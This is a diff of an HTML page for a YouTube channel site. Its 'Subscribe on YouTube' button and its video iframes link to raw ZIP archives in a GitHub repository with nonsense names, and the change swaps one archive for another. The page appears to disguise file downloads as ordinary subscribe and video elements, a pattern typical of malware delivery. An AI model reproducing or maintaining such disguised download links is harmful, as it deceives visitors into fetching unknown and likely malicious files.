@@ -76,14 +76,14 @@
   <header>
     <h1>SEVORDW</h1>
     <p>Official website of the YouTube channel</p>
-    <a class="btn" href="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo-io-github-ephebeion.zip" target="_blank">Subscribe on YouTube</a>
+    <a class="btn" href="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo_github_io_pyelometry.zip" target="_blank">Subscribe on YouTube</a>
   </header>
 
   <section>
     <h2>Latest Featured Video</h2>
     <div class="video">
       <iframe
-        src="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo-io-github-ephebeion.zip"
+        src="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo_github_io_pyelometry.zip"
         allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
         allowfullscreen>
       </iframe>
@@ -95,7 +95,7 @@
     <div class="video">
       <!-- Shows latest uploads from the channel automatically -->
       <iframe
-        src="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo-io-github-ephebeion.zip"
+        src="https://github.com/SEVORDW/sevo.github.io/raw/refs/heads/SEVO/undershrubbiness/sevo_github_io_pyelometry.zip"
         allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
         allowfullscreen>
       </iframe>
